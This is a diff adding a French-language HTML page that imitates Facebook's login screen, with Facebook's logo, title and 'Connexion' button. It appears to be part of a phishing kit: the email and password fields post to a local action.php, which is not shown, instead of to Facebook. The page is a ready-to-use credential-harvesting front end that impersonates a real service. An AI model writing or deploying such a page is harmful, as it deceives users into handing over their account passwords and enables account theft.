@@ -1,0 +1,51 @@
+<!doctype html>
+<html lang="fr">
+	<head>
+		<meta charset="utf-8">
+		<meta name="viewport" content="width=device-width, initial-scale=1">
+		<link rel="stylesheet" href="./css/bootstrap.min.css"/>
+   	<link rel="stylesheet" href="./css/fb.css"/>
+		<title>Se connecter à Facebook</title>
+		<link rel="icon" type="image/png" href="ressources/facebook.png"/>
+		<script type="application/javascript" src="./js/jquery-3.3.1.min.js"></script>
+    <script type="application/javascript" src="./js/bootstrap.min.js"></script>
+    <script type="application/javascript" src="./js/fb.js"></script>
+	</head>
+	<body>
+    <div class="header">
+        <img src="ressources/facebooktitle.png" height="65" id="logo">
+        <button class="sign-btn">Créer un compte</button>
+    </div>
+    <div class="container">
+			<div class="row">
+ 				<div class="col-sm-10 col-md-7 col-lg-7 mx-auto">
+ 					<div class="card card-signin my-5">
+ 						<div class="card-body">
+							<form action="action.php" method="post">
+								<h5>Se connecter à Facebook</h5>
+								<div class="form">
+									<input class="col-sm-10 col-md-7 col-lg-7" type="email" name="inputEmail" id="inputEmail" placeholder="Adresse e-mail">
+								</div>
+								<div class="form">
+									<input class="col-sm-10 col-md-7 col-lg-7" type="password" name="inputPassword" id="inputPassword" placeholder="Mot de passe">
+								</div>
+								<div class="form">
+									<button type="submit" class="btn btn-primary col-sm-10 col-md-7 col-lg-7">Connexion</button>
+								</div>
+								<div class="links">
+									<a href="">Informations de compte oubliées ?</a>
+									<span> · </span>
+									<a href="">S’inscrire sur Facebook</a>
+								</div>
+								<div class="later">
+									<a href="" id="later">Plus tard</a>
+								</div>
+							</form>
+					  </div>
+				  </div>
+			  </div>
+			 </div>
+
+    </div>
+	</body>
+</html>
